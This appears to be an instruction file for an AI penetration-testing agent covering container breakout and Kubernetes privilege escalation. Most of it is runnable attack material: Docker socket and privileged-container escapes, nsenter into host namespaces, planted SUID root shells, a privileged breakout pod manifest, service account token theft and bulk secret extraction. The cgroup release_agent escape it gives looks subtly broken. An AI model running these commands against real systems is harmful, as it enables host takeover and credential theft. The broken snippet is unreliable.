---
name: cypher-container
description: Container and Kubernetes security methodology covering Docker socket abuse, privileged container breakout, capabilities exploitation, host volume mounts, Kubernetes RBAC escalation, pod breakout, and service account token theft.
version: 0.1.0
finding_types: [VULN_CANDIDATE, EXPLOIT_RESULT, PRIVESC_VECTOR, MISCONFIGURATION, SESSION]
destructiveness: high
tags: [container, docker, kubernetes, privesc, breakout]
---

# Cypher Container / Kubernetes Security Skill

Use this skill when operating inside a Docker container, Kubernetes pod, or assessing container orchestration platforms. Focus: container breakout, cluster privilege escalation, and container image vulnerabilities.

## Container enumeration (from inside)

```bash
# Container detection
cat /proc/1/cgroup              # Contains /docker/ or /kubepods/
ls -la /.dockerenv              # File present → likely Docker container
cat /proc/self/mountinfo        # Check mounted volumes

# Capabilities
capsh --print                   # Current process capabilities
cat /proc/1/status | grep Cap   # Capability bitmask

# Mount points
mount
df -h
findmnt

# Environment (often contains secrets, service tokens)
env
cat /proc/1/environ | tr '\0' '\n'

# Network
ip a
cat /etc/hosts
netstat -tlnp
```

### Container breakout techniques

#### 1. Docker socket exposed
```bash
# If /var/run/docker.sock is mounted inside the container
docker -H unix:///var/run/docker.sock ps
# Spawn privileged container with host root mount
docker -H unix:///var/run/docker.sock run -d --privileged -v /:/host alpine chroot /host
# Execute on host
docker -H unix:///var/run/docker.sock exec -it <host-container-id> /bin/bash
```

#### 2. Privileged container
```bash
# Check if --privileged flag is set
cat /proc/self/status | grep Cap  # Full capabilities → likely privileged
# Mount host disk
fdisk -l
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
# Cgroup release_agent escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "/bin/sh -c 'chmod u+s /bin/bash'" > /release_agent
echo '#!/bin/sh' > /cmd && echo "chmod u+s /bin/bash" >> /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

#### 3. Dangerous capabilities
| Capability | Exploitation |
|------------|-------------|
| CAP_SYS_ADMIN | Mount host disk, cgroup escape, `nsenter -t 1 -a bash` |
| CAP_SYS_PTRACE | `gdb -p 1` → inject into host init process |
| CAP_SYS_MODULE | Insert kernel module → ring 0 |
| CAP_DAC_READ_SEARCH | Read any file on host (if accessible) |
| CAP_NET_RAW | Packet sniffing, ARP spoofing |
| CAP_SYS_RAWIO | Direct disk/memory access |
| CAP_SYS_BOOT | Reboot host (DoS) |
| CAP_NET_ADMIN | iptables manipulation, network reconfigure |

```bash
# CAP_SYS_ADMIN → mount host root
fdisk -l | grep -i linux
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# CAP_SYS_ADMIN → nsenter into host namespace
nsenter -t 1 -m -u -i -n -p -- /bin/bash

# CAP_SYS_MODULE → kernel module rootkit
# Write a kernel module, insmod <module>.ko
```

#### 4. Host volume mounts
```bash
# Check what's mounted from the host
cat /proc/1/mountinfo | grep -v " / " | grep "/var/lib/docker\|/var/lib/kubelet"
mount | grep -v "^/"
# Writable host volume → create SUID binary
cp /bin/bash /mnt/host/tmp/rootshell && chmod u+s /mnt/host/tmp/rootshell
# On host: /tmp/rootshell -p
```

#### 5. Host PID namespace (--pid=host)
```bash
# If pid namespace is shared with host
nsenter -t 1 -a /bin/bash
# Or inject into a host process
echo 'chmod u+s /bin/bash' | nsenter -t 1 -m -- /bin/bash -c 'cat > /tmp/privesc.sh && chmod +x /tmp/privesc.sh && /tmp/privesc.sh'
```

#### 6. Host network namespace (--net=host)
```bash
# Access host services on localhost
# Internal services (Redis, PostgreSQL, etc.) may be accessible
# Wireshark/tcpdump: capture ALL host traffic
tcpdump -i any not port 22
```

## Kubernetes

### Pod enumeration
```bash
# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# API server access
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_PORT_443_TCP_PORT}
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods

# kubectl (if installed)
kubectl auth can-i --list
kubectl get pods --all-namespaces
kubectl get secrets
```

### Service account RBAC escalation

```bash
# Check SA permissions
kubectl auth can-i --list --as=system:serviceaccount:<namespace>:<sa>
# Key verbs to look for:
# create pods, create deployments, create statefulsets → run arbitrary pod with host mounts
# get secrets, list secrets → extract other SA tokens
# create clusterrolebindings → grant cluster-admin
# create roles, create rolebindings → escalate within namespace
# create validatingwebhookconfigurations → intercept API requests
# impersonate users/groups → act as other principals
# exec into pods, port-forward pods → access running workloads
```

### Pod escape via privileged pod creation

If SA can create pods:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: breakout
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: breakout
    image: alpine
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -p -- /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostroot
      mountPath: /host
  volumes:
  - name: hostroot
    hostPath:
      path: /
```

### K8s secrets extraction
```bash
# List secrets
kubectl get secrets -o yaml
# Decode
kubectl get secret <name> -o jsonpath='{.data.<key>}' | base64 -d

# Common secrets: SA tokens (for lateral movement), DB passwords, API keys, TLS certs
```

### ETCD access
If the etcd endpoint is accessible (port 2379, typically requires certificates):
```bash
etcdctl --endpoints=https://<etcd-ip>:2379 --cert=... --key=... get / --prefix --keys-only
# etcd contains ALL cluster secrets in plaintext
```

## Container image auditing

```bash
# Scan image for vulnerabilities
trivy image <image>:<tag>
# Scan IaC files for misconfigurations
checkov -d ./k8s-manifests/
# Detect secrets in images
trufflehog filesystem /path/to/extracted/image
# Dockerfile analysis
hadolint Dockerfile
```

## Evidence rules

- Save enumeration output (`capsh --print`, mounts, capabilities) to `/mnt/project/recon/container/`.
- Save breakout proof (host `whoami` output) to `/mnt/project/exploit/container-breakout-proof.txt`.
- Document: container runtime (Docker/containerd/CRI-O), capabilities, mount points, and the specific breakout technique.
- For K8s, capture the SA token permissions, the RBAC escalation path, and any extracted secrets.

## Prefix examples

```text
[cypher:finding type=PRIVESC_VECTOR confidence=0.98 severity=critical tags=container,docker,socket artifacts=/mnt/project/recon/container/enum.txt cleanup=none] Docker socket `/var/run/docker.sock` mounted inside container — host root breakout trivial via `docker run -v /:/host alpine chroot /host`.
```

```text
[cypher:finding type=EXPLOIT_RESULT confidence=1.0 severity=critical tags=kubernetes,rbac artifacts=/mnt/project/exploit/container-breakout-proof.txt cleanup=none] Pod SA has `create pods` RBAC — deployed privileged pod with hostPID/hostNetwork, chroot to host root. Full node compromise achieved.
```
